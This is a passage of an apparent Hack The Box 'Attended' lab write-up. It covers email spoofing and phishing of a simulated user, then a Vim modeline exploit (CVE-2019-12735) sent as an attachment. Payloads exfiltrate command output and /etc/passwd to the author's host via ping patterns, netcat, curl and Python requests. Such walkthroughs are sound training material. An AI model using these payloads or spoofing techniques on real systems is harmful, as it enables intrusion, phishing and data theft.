+</pre></table></code></div></div><p>I tried changing up my email address to come from a valid internal email address. I still did not seem to get any response.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-4-blocked-replies.png" alt="Wireshark output showing my machine sending reset packets to all of the SMTP connection requests" /></p><p>After sending numerous tries, I started getting packets from the target machine that tried to connect to my machine’s port 25. My machine did not have the port open so it kept sending reset packets back. It looked like I needed to set up an SMTP server or a listener on port 25.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ sudo nc -lvnp 25
+[sudo] password for zweilos: 
+listening on [any] 25 ...
+connect to [10.10.14.172] from (UNKNOWN) [10.10.10.221] 1307
+</pre></table></code></div></div><p>My netcat listener on port 25 got a connect back, but there was no data that I could see.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>250
+EHLO attendedgw.htb
+</pre></table></code></div></div><p>I sent “250” to the machine and got back a reply saying it was <code class="language-plaintext highlighter-rouge">attendedgw.htb</code>. Since it was connecting to port 25 I made the assumption that it was SMTP traffic. It stopped sending after that, so I started my netcat listener again to try again. This time I looked at the Wireshark output to look at the proper response codes to send back to it. I sent another mail, spoofing the email address <code class="language-plaintext highlighter-rouge">root@attended.htb</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ sudo nc -lvnp 25 
+[sudo] password for zweilos: 
+listening on [any] 25 ...
+250
+250
+250
+250
+354
+250
+connect to [10.10.14.172] from (UNKNOWN) [10.10.10.221] 43881
+EHLO attendedgw.htb
+MAIL FROM:&lt;guly@attended.htb&gt;
+RCPT TO:&lt;root@[10.10.14.172]&gt;
+DATA
+Received: from attended.htb (attended.htb [192.168.23.2])
+        by attendedgw.htb (Postfix) with ESMTP id 77B7632D5D
+        for &lt;root@10.10.14.172&gt;; Mon, 26 Apr 2021 05:07:35 +0200 (CEST)
+Content-Type: multipart/alternative;
+ boundary="===============2957209377152459646=="
+MIME-Version: 1.0
+Subject: Re: Check this out
+From: guly@attended.htb
+
+--===============2957209377152459646==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+
+hello, thanks for writing.
+i'm currently quite busy working on an issue with freshness and dodging any email from everyone but him. i'll get back in touch as soon as possible.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\ 
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments
+
+--===============2957209377152459646==--
+.
+QUIT
+</pre></table></code></div></div><p>Who needs an smtp client when you know how to send back valid response codes manually? I typed the responses myself line by line as each line was sent to me. Eventually I got the whole email. I discovered after doing this a few times that you could type the response codes one at a time before the connection came in and they would all get processed at once. This really sped up my wait for each email. After reading the email I got, I could see it was a reply from the user <code class="language-plaintext highlighter-rouge">guly</code>. It looks like <code class="language-plaintext highlighter-rouge">guly</code> was only responding to emails from his partner, however.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sudo python3 -m smtpd -n -c DebuggingServer 0.0.0.0:25
+</pre></table></code></div></div><p>Note: after watching Ippsec do this box later, I found out you can set up an SMTP server with python too! I wish I had known this while doing this machine.This would have made receiving mail much easier, as you don’t have to restart it after receiving each email!</p><h3 id="phishing-for-guly">Phishing for guly</h3><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>┌──<span class="o">(</span>zweilos㉿kali<span class="o">)</span>-[~/htb/attended]
+└─<span class="nv">$ </span><span class="k">for </span>address <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>user<span class="si">)</span><span class="p">;</span> <span class="k">do </span>swaks <span class="nt">--helo</span> attended.htb <span class="nt">--to</span> <span class="nv">$address</span> <span class="nt">--from</span> freshness@attended.htb <span class="nt">--header</span> <span class="s2">"Subject: Check this out"</span> <span class="se">\-</span><span class="nt">-body</span> <span class="s2">"Check this out</span><span class="se">\n</span><span class="s2">http://10.10.14.172:8090/"</span> <span class="nt">--server</span> 10.10.10.221<span class="p">;</span> <span class="k">done</span>  
+<span class="o">===</span> Trying 10.10.10.221:25...
+<span class="o">===</span> Connected to 10.10.10.221.
+&lt;-  220 proudly setup by guly <span class="k">for </span>attended.htb ESMTP OpenSMTPD
+ -&gt; EHLO attended.htb
+&lt;-  250-proudly setup by guly <span class="k">for </span>attended.htb Hello attended.htb <span class="o">[</span>10.10.14.172], pleased to meet you
+&lt;-  250-8BITMIME
+&lt;-  250-ENHANCEDSTATUSCODES
+&lt;-  250-SIZE 36700160
+&lt;-  250-DSN
+&lt;-  250 HELP
+ -&gt; MAIL FROM:&lt;freshness@attended.htb&gt;
+&lt;-  250 2.0.0: Ok
+ -&gt; RCPT TO:&lt;guly@attended.htb&gt;
+&lt;-  250 2.1.5 Destination address valid: Recipient ok
+ -&gt; DATA
+&lt;-  354 Enter mail, end with <span class="s2">"."</span> on a line by itself
+ -&gt; Date: Mon, 26 Apr 2021 05:05:32 +0200
+ -&gt; To: guly@attended.htb
+ -&gt; From: freshness@attended.htb
+ -&gt; Subject: Check this out
+ -&gt; Message-Id: &lt;20210508132631.1653112@kali&gt;
+ -&gt; X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
+ -&gt; 
+ -&gt; Check this out
+ -&gt; http://10.10.14.172:8090/
+ -&gt; 
+ -&gt; 
+ -&gt; <span class="nb">.</span>
+&lt;-  250 2.0.0: bde07d85 Message accepted <span class="k">for </span>delivery
+ -&gt; QUIT
+&lt;-  221 2.0.0: Bye
+<span class="o">===</span> Connection closed with remote host.
+</pre></table></code></div></div><p>Next I sent an email spoofing <code class="language-plaintext highlighter-rouge">freshness</code>’s email address to see if he would respond differently.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre><td class="rouge-code"><pre>Subject: Re: Check this out
+From: guly@attended.htb
+
+hi mate, could you please double check your attachment? looks like you forgot to actually attach anything :)
+
+p.s.: i also installed a basic py2 env on gw so you can PoC quickly my new outbound traffic restrictions. i think it should stop any non RFC compliant connection.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\ 
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments
+</pre></table></code></div></div><p>I got back an email from <code class="language-plaintext highlighter-rouge">guly</code> responding to my email as <code class="language-plaintext highlighter-rouge">freshness</code> saying that I forgot to attach a file. It also mentioned that a Python2 enviroment was set up to test some “outbound traffic restrictions”. Apparently <code class="language-plaintext highlighter-rouge">guly</code> was also a fan of openbsd and vim, and hated html email and proprietary email attachments. All of these things seemed like hints that could help me craft a way to get onto the machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>Subject: Re: Check this out
+From: guly@attended.htb
+
+
+hi mate, i'm sorry but i can't read your attachment. could you please remember i'm against proprietary e-mail attachments? :)
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\ 
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments
+</pre></table></code></div></div><p>I modified my email to include a shell script that would ping my computer, and got back an email saying that <code class="language-plaintext highlighter-rouge">guly</code> couldn’t read my email. Maybe he only accepted python attachments?</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
+</span><span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping -c 10 10.10.14.172'</span><span class="p">)</span>
+</pre></table></code></div></div><p>I tried sending a python script that would ping my machine, but got back the same email as before about not being able to read my attachment.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre><td class="rouge-code"><pre>Subject: Re: Check this out
+From: guly@attended.htb
+
+
+thanks dude, i'm currently out of the office but will SSH into the box immediately and open your attachment with vim to verify its syntax.
+if everything is fine, you will find your config file within a few minutes in the /home/shared folder.
+test it ASAP and let me know if you still face that weird issue.
+
+
+---
+guly
+
+OpenBSD user since 1995
+Vim power user
+
+/"\ 
+\ /  ASCII Ribbon Campaign
+ X   against HTML e-mail
+/ \  against proprietary e-mail attachments
+</pre></table></code></div></div><p>This time I sent a non-existant file, but named the attachment <code class="language-plaintext highlighter-rouge">test2.py</code>. It looked as if <code class="language-plaintext highlighter-rouge">guly</code> was not in the office, but would open my attachment with <code class="language-plaintext highlighter-rouge">vim</code>. It seemed as if I would need to send a payload that would execute when opened in <code class="language-plaintext highlighter-rouge">vim</code>. I wondered if it had been the OS command or the shebang that made the attachment not valid in my previous attachment.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
+</span><span class="k">print</span><span class="p">(</span><span class="s">"Hello guly"</span><span class="p">)</span>
+</pre></table></code></div></div><p>Sending this simple python file also got back the “I can’t read your attachment” message.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">os</span>
+<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">'ping -c 10 10.10.14.172'</span><span class="p">)</span>
+</pre></table></code></div></div><p>For the next attempt I sent my ping command without the shebang, and got the message about opening my file with <code class="language-plaintext highlighter-rouge">vim</code> when he gets back to the office again. It seemed like I didn’t need to specify python2. I still did not get back any pings, however.</p><ul><li>https://www.tutorialspoint.com/python/python_sending_email.htm<li>https://medium.com/@magrabursofily/exploit-poc-linux-command-execution-on-vim-neovim-vulnerability-cve-2019-12735-4c770d5573cf<li>https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=930020<li>https://github.com/numirias/security/blob/master/doc/2019-06-04_ace-vim-neovim.md</ul><p>I did some research on <code class="language-plaintext highlighter-rouge">vim</code> exploits using python and found a medium article on CVE-2019-12735 that looked interesting. I did a bit more looking and found a PoC for this on GitHub. It didn’t use python, but I thought I’d give it a try anyway.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:!ping <span class="nt">-c</span> 10 10.10.14.172||<span class="s2">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="nb">source</span><span class="se">\!\ \%</span><span class="s2">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>I send the PoC with a command to ping my machine again. I didnt get any pings, but I did get a message saying <code class="language-plaintext highlighter-rouge">guly</code> would check out the file when he got home. I wondered how long it would take him to get home… :laugh:</p><p>Note: I realized after the next email that I sent that my Wireshark traffic showed that I was <code class="language-plaintext highlighter-rouge">10.10.14.182</code>. Yesterday it had been <code class="language-plaintext highlighter-rouge">10.10.14.172</code>…so close but enough to throw off all my testing!</p><h2 id="remote-code-execution">Remote Code Execution</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-5-ping-success.png" alt="Wireshark output showing successful ping attempts reaching my machine" /></p><p>I fixed the IP address in my script and got back ICMP echo requests! It was interesting…this time I did not get an email, just the pings. (Maybe I just missed it, got emails from now on…)</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:!curl http://10.10.14.182:8090/||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre></table></code></div></div><p>Next I tried to use <code class="language-plaintext highlighter-rouge">curl</code> to connect to my HTTP server, but I didn’t even see the traffic in Wireshark.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:! nc 10.10.14.182 8091 &lt; /etc/passwd ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre></table></code></div></div><p>next I tried netcat. If this didn’t work then a reverse shell probably wouldn’t either. It didn’t work, with or without the attempt to exfiltrate <code class="language-plaintext highlighter-rouge">/etc/passwd</code>. It was looking like ping might be my only choice. I decided to research ICMP tunneling.</p><h3 id="exploring-with-ping">Exploring with ping</h3><ul><li>https://resources.infosecinstitute.com/topic/icmp-reverse-shell/<li>https://cryptsus.com/blog/icmp-reverse-shell.html<li>https://curesec.com/blog/article/blog/Exfiltrate-Data-using-the-old-ping-utility-trick-23.html</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:!  ping -p DEADBEEF -c 5 10.10.14.182 ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre></table></code></div></div><p>This time I used ping to specify a pattern to send. I send <code class="language-plaintext highlighter-rouge">DEADBEEF</code> as it would be easy to pick out in traffic. (Note: the data needs to be in hex, which is why I chose <code class="language-plaintext highlighter-rouge">DEADBEEF</code>.)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-6-ping-BEEF.png" alt="The dead beef message in the wireshark output" /></p><p>This time I got an email back, so I assumed it didn’t work, but to my surprise there was ICMP traffic in my Wireshark output. I could clearly see my DEADBEEF message in the hex output. According to this network traffic, the code gets executed roughly the same time as the server starts sending me an email reply. There is a bit of a delay.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:!  ping -p $(echo D34DB33F) -c 5 10.10.14.182 ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre></table></code></div></div><p>I made a simple modification to my last test. I used an inline command substitution technique to run the command <code class="language-plaintext highlighter-rouge">echo D34DB33F</code> and insert that in the pattern to send.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-7-ping-B33F.png" alt="The upgraded dead beef test in wireshark output" /></p><p>I was successful. I now had a way to send myself messages back from the server. Now I had to figure out how to send useful information. I tried figuring out the username by using <code class="language-plaintext highlighter-rouge">$(whoami)</code> but nothing came back. I assumed there was an error that killed the whole script from executing.</p><h3 id="code-execution-with-ping--p-and-xxd--p">Code execution with <code class="language-plaintext highlighter-rouge">ping -p</code> and <code class="language-plaintext highlighter-rouge">xxd -p</code></h3><ul><li>https://linux.die.net/man/8/ping</ul><blockquote><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>-p pattern
+You may specify up to 16 ''pad'' bytes to fill out the packet you send. This is useful for diagnosing data-dependent problems in a network. For example, -p ff will cause the sent packet to be filled with all ones.
+</pre></table></code></div></div></blockquote><p>From the man page for ping it looked like anything that was send would be sent as bytes. The DEADBEEF messages I sent earlier were interpreted directly as hex. Maybe I could hex encode the result?</p><ul><li>https://linux.die.net/man/1/xxd</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>:!  ping -p $(whoami | xxd -p) -c 5 10.10.14.182 ||" vi:fen:fdm=expr:fde=assert_fails("source\!\ \%"):fdl=0:fdt="
+</pre></table></code></div></div><p>I used <code class="language-plaintext highlighter-rouge">xxd -p</code> to encode the result of <code class="language-plaintext highlighter-rouge">whoami</code> as a continuous stream of hexidecimal output.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-8-ping-whoami.png" alt="" /></p><p>Success! I saw the name <code class="language-plaintext highlighter-rouge">guly</code> in the ASCII interpretation of the wireshark output. <code class="language-plaintext highlighter-rouge">whoami</code> hadn’t worked by itself, but hex-encoding the result did!</p><ul><li>https://serverfault.com/questions/105838/make-ls-print-it-all-on-one-line-like-in-terminal</ul><p>I decided to take what I had learned to get more data, but I seemed to be very limited by the 16 byte maximum. My tests would fail if the result was longer than that. I tried <code class="language-plaintext highlighter-rouge">ls | xargs</code>, <code class="language-plaintext highlighter-rouge">uname -a</code>, and <code class="language-plaintext highlighter-rouge">id</code>. I decided this was a bit too limiting so I started looking for another option. I looked back through my notes to see if I had missed anything and realized I hadn’t tried to use python combined with this PoC code for Vim yet.</p><h3 id="python-code-execution-with-requests">Python code execution with requests</h3><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import os;os.system('ping -p $(echo pypy | xxd) -c 5 10.10.14.182')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>I tried code execution with <code class="language-plaintext highlighter-rouge">os.system()</code> using <code class="language-plaintext highlighter-rouge">ping -p</code> again, combining all of things I had tried so far.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-10-pypy.png" alt="Wirshark output showing the pypy text in the ICMP requests" /></p><p>I could clearly see my “pypy” message in the ICMP requests. Since I now had code execution using Python, I wondered if I could get anything other than ICMP through.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import requests;requests.get('http://10.10.14.182/$(whoami)')"</span>
+</pre></table></code></div></div><p>Next, I tried to see if I could use the requests module to get output back, since this could give me better output than through ping’s limitations.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-9-http-whoami.png" alt="The successful attempt to use whoami through python requests" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>zweilos@kali:~/htb/attended$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.10.221 - - [27/Apr/2021 20:46:56] code 404, message File not found
+10.10.10.221 - - [27/Apr/2021 20:46:56] "GET /guly HTTP/1.1" 404 -
+</pre></table></code></div></div><p>I was able to see the result of my attempt to execute the <code class="language-plaintext highlighter-rouge">whoami</code> command in the HTTP request to my server. I was not able to get traffic to come through on port 8090, but it worked on port 80. It seemed as if there was a firewall of some sort blocking outbound traffic.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import requests;requests.get('http://10.10.14.182/$(id | base64)')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>This simply requested the root directory of my http server.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import requests;requests.get('http://10.10.14.182/?test=$(id | base64)')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-11-no-base64.png" alt="Wireshark output showing the HTTP request for the parameter test with no base64" /></p><p>The request came back this time, but the base64 was stripped out again. It seemed as if there was also some sort of egress filtering going on.</p><ul><li>https://stackoverflow.com/questions/4760215/running-shell-command-and-capturing-the-output<li>https://nixdoc.net/man-pages/OpenBSD/man1/b64encode.1.html</ul><p>I did some more research and found that apparently OpenBSD has its own version of the base64 command <code class="language-plaintext highlighter-rouge">b64encode</code>. None of the tests I tried using this command worked.</p><ul><li>https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/private-content-linux-openssl.html<li>https://askubuntu.com/questions/178521/how-can-i-decode-a-base64-string-from-the-command-line</ul><p>While searching I found another way to do base64 using <code class="language-plaintext highlighter-rouge">openssl</code>.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import requests;requests.get('http://10.10.14.182/$(id | openssl enc -base64 | tr -- '+=/' '-_~')')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>This time I tried the same test, but using the <code class="language-plaintext highlighter-rouge">openssl</code> version of base64 encoding instead.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>10.10.10.221 - - [27/Apr/2021 21:36:56] "GET /dWlkPTEwMDAoZ3VseSkgZ2lkPTEwMDAoZ3VseSkgZ3JvdXBzPTEwMDAoZ3VseSkK HTTP/1.1" 404 -
+</pre></table></code></div></div><p>This time I got a hit back on my HTTP server that included base64 output!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/toolbox]
+└─$ echo dWlkPTEwMDAoZ3VseSkgZ2lkPTEwMDAoZ3VseSkgZ3JvdXBzPTEwMDAoZ3VseSkK | base64 -d   
+uid=1000(guly) gid=1000(guly) groups=1000(guly)
+</pre></table></code></div></div><p>I now had full command output return. I tried to <code class="language-plaintext highlighter-rouge">cat /etc/passwd</code> but failed again.</p><ul><li>https://stackoverflow.com/questions/15580144/how-to-concatenate-multiple-lines-of-output-to-one-line</ul><p>I did a bit of research and found a way to trim off newline characters and put all the output on one line, hoping this would solve the problem.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import requests;requests.get('http://10.10.14.182/$(ls | openssl enc -base64 | tr -- '+=/' '-_~')')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>"GET /Z2NoZWNrZXIucHkgbWJveCB0bXAg HTTP/1.1" 404 -
+</pre></table></code></div></div><p>Got a reply back on my HTTP server with base64 encoded data!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/toolbox]
+└─$ echo Z2NoZWNrZXIucHkgbWJveCB0bXAg | base64 -d                                    
+gchecker.py mbox tmp
+</pre></table></code></div></div><p>I got back a listing of files/folders in <code class="language-plaintext highlighter-rouge">/home/guly</code>. I wondered what gchecker.py was.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre><span class="p">:</span><span class="err">!</span>  <span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s">"import os;os.system('mkdir /home/guly/test')"</span> <span class="o">||</span><span class="s">" vi:fen:fdm=expr:fde=assert_fails("</span><span class="n">source</span>\<span class="err">!</span>\ \<span class="o">%</span><span class="s">"):fdl=0:fdt="</span>
+</pre></table></code></div></div><p>created folder in /home/guly, then verified its existence</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ echo Z2NoZWNrZXIucHkgbWJveCB0ZXN0IHRtcCA= | base64 -d
+gchecker.py mbox test tmp
+</pre></table></code></div></div><p>I used ls ~/ to verify that the folder I was working in was the home directory.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-12-swap.png" alt="Wireshark output showing that I got the contents of the tmp folder" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/attended]
+└─$ echo LiAuLiAuY29uZmlnLnN3cAo= | base64 -d
+. .. .config.swp
+</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">~/tmp</code> folder I found a vim swap file. It looked like this may have been the config file that <code class="language-plaintext highlighter-rouge">guly</code> had mentioned in his emails.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>Host *
+User freshness
+ControlMaster auto
+ControlPath /tmp/%r@%h:%p
+ControlPersist 4h
+TCPKeepAlive yes
+ServerAliveInterval 60
+</pre></table></code></div></div><p>I discovered the vim swap file was opening a config file in the <code class="language-plaintext highlighter-rouge">/home/shared/</code> folder. This file held the contents of an SSH configuration. I did some research to see if there was a way to execute commands from the SSH config file since I could write here.</p><ul><li>https://www.ssh.com/academy/ssh/config</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/attended-13-proxycommand.png" alt="The SSH configuration file option proxycommand definition" /></p><p>Found a promising entry: Proxycommand</p><ul><li>https://blog.jverkamp.com/2017/12/18/ssh-config-proxycommand-tricks/</ul><p>It looked like I can execute arbitrary command using this parameter.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
